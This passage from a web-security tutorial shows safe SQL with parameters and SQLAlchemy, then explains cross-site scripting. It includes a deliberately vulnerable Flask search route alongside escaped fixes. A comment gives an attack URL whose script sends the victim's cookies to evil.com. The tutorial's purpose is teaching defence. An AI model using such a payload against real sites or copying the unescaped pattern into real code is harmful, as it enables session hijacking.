<span class="c1"># FIXED: Parameterize even when data comes from your own database</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/change-password&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">change_password_secure</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">get_current_user</span><span class="p">()</span>
    <span class="n">new_password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;new_password&#39;</span><span class="p">]</span>
    <span class="n">new_hash</span> <span class="o">=</span> <span class="n">hash_password</span><span class="p">(</span><span class="n">new_password</span><span class="p">)</span>

    <span class="n">db</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
    <span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span>
        <span class="s2">&quot;UPDATE users SET password_hash = ? WHERE id = ?&quot;</span><span class="p">,</span>
        <span class="p">(</span><span class="n">new_hash</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>  <span class="c1"># Use user ID (integer), not username</span>
    <span class="p">)</span>
    <span class="n">db</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;updated&quot;</span><span class="p">})</span>
</code></pre></div>

<h3 id="24-sqlalchemy-orm-recommended-approach">2.4 SQLAlchemy ORM (Recommended Approach)<a class="header-link" href="#24-sqlalchemy-orm-recommended-approach" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">sqlalchemy_safe.py - Using SQLAlchemy ORM for automatic parameterization</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask_sqlalchemy</span><span class="w"> </span><span class="kn">import</span> <span class="n">SQLAlchemy</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SQLALCHEMY_DATABASE_URI&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sqlite:///app.db&#39;</span>
<span class="n">db</span> <span class="o">=</span> <span class="n">SQLAlchemy</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>


<span class="k">class</span><span class="w"> </span><span class="nc">User</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">80</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">email</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">120</span><span class="p">),</span> <span class="n">unique</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">password_hash</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">256</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>


<span class="k">class</span><span class="w"> </span><span class="nc">Product</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Model</span><span class="p">):</span>
    <span class="nb">id</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Integer</span><span class="p">,</span> <span class="n">primary_key</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="mi">200</span><span class="p">),</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">price</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Float</span><span class="p">,</span> <span class="n">nullable</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">description</span> <span class="o">=</span> <span class="n">db</span><span class="o">.</span><span class="n">Column</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">Text</span><span class="p">)</span>


<span class="c1"># SAFE: ORM queries are automatically parameterized</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># ORM handles parameterization</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">first</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">verify_password</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">user</span><span class="o">.</span><span class="n">password_hash</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;logged in&quot;</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/search&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># SAFE: SQLAlchemy parameterizes this</span>
    <span class="n">products</span> <span class="o">=</span> <span class="n">Product</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">filter</span><span class="p">(</span>
        <span class="n">Product</span><span class="o">.</span><span class="n">name</span><span class="o">.</span><span class="n">ilike</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s1">%&#39;</span><span class="p">)</span>
    <span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([{</span>
        <span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">id</span><span class="p">,</span>
        <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
        <span class="s2">&quot;price&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">price</span>
    <span class="p">}</span> <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">products</span><span class="p">])</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/products&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">list_products</span><span class="p">():</span>
    <span class="c1"># SAFE: Whitelist + ORM for sorting</span>
    <span class="n">sort_column</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;sort&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">)</span>
    <span class="n">sort_order</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;order&#39;</span><span class="p">,</span> <span class="s1">&#39;asc&#39;</span><span class="p">)</span>

    <span class="n">ALLOWED_COLUMNS</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">Product</span><span class="o">.</span><span class="n">name</span><span class="p">,</span>
        <span class="s1">&#39;price&#39;</span><span class="p">:</span> <span class="n">Product</span><span class="o">.</span><span class="n">price</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">column</span> <span class="o">=</span> <span class="n">ALLOWED_COLUMNS</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">sort_column</span><span class="p">,</span> <span class="n">Product</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">sort_order</span> <span class="o">==</span> <span class="s1">&#39;desc&#39;</span><span class="p">:</span>
        <span class="n">column</span> <span class="o">=</span> <span class="n">column</span><span class="o">.</span><span class="n">desc</span><span class="p">()</span>

    <span class="n">products</span> <span class="o">=</span> <span class="n">Product</span><span class="o">.</span><span class="n">query</span><span class="o">.</span><span class="n">order_by</span><span class="p">(</span><span class="n">column</span><span class="p">)</span><span class="o">.</span><span class="n">all</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">([{</span><span class="s2">&quot;id&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">id</span><span class="p">,</span> <span class="s2">&quot;name&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="s2">&quot;price&quot;</span><span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">price</span><span class="p">}</span>
                    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">products</span><span class="p">])</span>


<span class="c1"># WARNING: Raw SQL in ORM can still be vulnerable!</span>

<span class="c1"># VULNERABLE: Raw SQL string formatting</span>
<span class="c1"># db.session.execute(f&quot;SELECT * FROM users WHERE name = &#39;{name}&#39;&quot;)</span>

<span class="c1"># SAFE: Raw SQL with parameters</span>
<span class="c1"># db.session.execute(text(&quot;SELECT * FROM users WHERE name = :name&quot;),</span>
<span class="c1">#                    {&quot;name&quot;: name})</span>
</code></pre></div>

<hr />
<h2 id="3-cross-site-scripting-xss">3. Cross-Site Scripting (XSS)<a class="header-link" href="#3-cross-site-scripting-xss" title="Permanent link">&para;</a></h2>
<h3 id="31-xss-overview">3.1 XSS Overview<a class="header-link" href="#31-xss-overview" title="Permanent link">&para;</a></h3>
<p>XSS allows attackers to inject malicious scripts into web pages viewed by other users. The script executes in the victim's browser with the same permissions as the legitimate page.</p>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">              </span><span class="n">Cross</span><span class="o">-</span><span class="n">Site</span><span class="w"> </span><span class="n">Scripting</span><span class="w"> </span><span class="p">(</span><span class="n">XSS</span><span class="p">)</span><span class="w"> </span><span class="n">Types</span><span class="w">                    </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mf">1.</span><span class="w"> </span><span class="n">Reflected</span><span class="w"> </span><span class="n">XSS</span><span class="w"> </span><span class="p">(</span><span class="n">Type</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="n">Payload</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="p">(</span><span class="n">URL</span><span class="p">,</span><span class="w"> </span><span class="n">form</span><span class="w"> </span><span class="n">data</span><span class="p">)</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="n">Server</span><span class="w"> </span><span class="n">includes</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">response</span><span class="w"> </span><span class="n">without</span><span class="w"> </span><span class="n">escaping</span><span class="w">         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">    </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">    </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">Victim</span><span class="err">â”‚â”€â”€â”€â–¶â”‚</span><span class="n">Server</span><span class="err">â”‚â”€â”€â”€â–¶â”‚</span><span class="n">Victim</span><span class="err">â”‚</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">clicks</span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">echoes</span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">script</span><span class="err">â”‚</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">link</span><span class="w">  </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">input</span><span class="w"> </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">runs</span><span class="w">  </span><span class="err">â”‚</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">    </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">    </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">                           </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mf">2.</span><span class="w"> </span><span class="n">Stored</span><span class="w"> </span><span class="n">XSS</span><span class="w"> </span><span class="p">(</span><span class="n">Type</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w">                                         </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="n">Payload</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">stored</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="p">(</span><span class="n">comment</span><span class="p">,</span><span class="w"> </span><span class="n">profile</span><span class="p">,</span><span class="w"> </span><span class="n">etc</span><span class="o">.</span><span class="p">)</span><span class="w">  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="n">Served</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">ALL</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">who</span><span class="w"> </span><span class="n">view</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">page</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”</span><span class="w">    </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">    </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">    </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">Attacker</span><span class="err">â”‚â”€â”€â”€â–¶â”‚</span><span class="n">Server</span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">Server</span><span class="err">â”‚â”€â”€â”€â–¶â”‚</span><span class="n">Victim</span><span class="err">â”‚</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">stores</span><span class="w">  </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">saves</span><span class="w"> </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">serves</span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">script</span><span class="err">â”‚</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">payload</span><span class="w"> </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">to</span><span class="w"> </span><span class="n">DB</span><span class="w"> </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">from</span><span class="w">  </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â”‚</span><span class="n">runs</span><span class="w">  </span><span class="err">â”‚</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">    </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">    </span><span class="err">â”‚</span><span class="n">DB</span><span class="w">    </span><span class="err">â”‚</span><span class="w">    </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                               </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">                          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mf">3.</span><span class="w"> </span><span class="n">DOM</span><span class="o">-</span><span class="n">Based</span><span class="w"> </span><span class="n">XSS</span><span class="w"> </span><span class="p">(</span><span class="n">Type</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="n">Payload</span><span class="w"> </span><span class="n">never</span><span class="w"> </span><span class="n">reaches</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">server</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="n">JavaScript</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">reads</span><span class="w"> </span><span class="n">attacker</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">URL</span><span class="o">/</span><span class="n">DOM</span><span class="w">    </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="ow">and</span><span class="w"> </span><span class="n">inserts</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">unsafely</span><span class="w">                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">                     </span><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">Victim</span><span class="err">â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶â”‚</span><span class="n">Client</span><span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">clicks</span><span class="err">â”‚</span><span class="w">  </span><span class="n">URL</span><span class="w"> </span><span class="n">fragment</span><span class="w"> </span><span class="p">(</span><span class="c1">#)   â”‚  JS  â”‚                      â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â”‚</span><span class="n">link</span><span class="w">  </span><span class="err">â”‚</span><span class="w">  </span><span class="ow">or</span><span class="w"> </span><span class="n">DOM</span><span class="w"> </span><span class="n">property</span><span class="w">    </span><span class="err">â”‚</span><span class="w"> </span><span class="n">reads</span><span class="w"> </span><span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">                     </span><span class="err">â”‚</span><span class="w"> </span><span class="ow">and</span><span class="w">   </span><span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                  </span><span class="err">â”‚</span><span class="n">injects</span><span class="err">â”‚</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                  </span><span class="err">â””â”€â”€â”€â”€â”€â”€â”˜</span><span class="w">                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<h3 id="32-reflected-xss">3.2 Reflected XSS<a class="header-link" href="#32-reflected-xss" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">xss_reflected.py - Reflected XSS vulnerability and fix</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">Markup</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">html</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: Reflected XSS</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search-vulnerable&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_vulnerable</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># VULNERABLE: User input directly in HTML without escaping</span>
    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;You searched for: </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;No results found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span>

<span class="c1"># Attack URL:</span>
<span class="c1"># /search-vulnerable?q=&lt;script&gt;document.location=&#39;https://evil.com/steal?cookie=&#39;+document.cookie&lt;/script&gt;</span>
<span class="c1"># When victim clicks this link, their cookies are sent to attacker</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># FIXED: Output encoding / escaping</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search-secure&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_secure</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Method 1: Manual HTML escaping</span>
    <span class="n">safe_query</span> <span class="o">=</span> <span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>

    <span class="k">return</span> <span class="sa">f</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;You searched for: </span><span class="si">{</span><span class="n">safe_query</span><span class="si">}</span><span class="s2">&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;No results found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span>

<span class="c1"># Input:  &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</span>
<span class="c1"># Output: &amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;)&amp;lt;/script&amp;gt;</span>
<span class="c1"># Renders as text, not as executable script</span>


<span class="c1"># Method 2: Use Jinja2 templates (auto-escaping enabled by default)</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/search-template&#39;</span><span class="p">)</span>
<span class="k">def</span><span class="w"> </span><span class="nf">search_template</span><span class="p">():</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Jinja2 auto-escapes {{ query }} by default</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">&quot;&quot;&quot;</span>
<span class="s2">    &lt;html&gt;</span>
<span class="s2">    &lt;body&gt;</span>
<span class="s2">        &lt;h1&gt;Search Results&lt;/h1&gt;</span>
<span class="s2">        &lt;p&gt;You searched for: {{ query }}&lt;/p&gt;</span>
<span class="s2">        &lt;p&gt;No results found.&lt;/p&gt;</span>
<span class="s2">    &lt;/body&gt;</span>
<span class="s2">    &lt;/html&gt;</span>
<span class="s2">    &quot;&quot;&quot;</span><span class="p">,</span> <span class="n">query</span><span class="o">=</span><span class="n">query</span><span class="p">)</span>


<span class="c1"># WARNING: Jinja2&#39;s |safe filter and Markup() disable auto-escaping!</span>
<span class="c1"># NEVER use these with user input:</span>
<span class="c1"># {{ user_input|safe }}         â† DANGEROUS</span>
<span class="c1"># Markup(user_input)            â† DANGEROUS</span>
</code></pre></div>

<h3 id="33-stored-xss">3.3 Stored XSS<a class="header-link" href="#33-stored-xss" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">xss_stored.py - Stored XSS vulnerability and fix</span>
<span class="sd">&quot;&quot;&quot;</span>
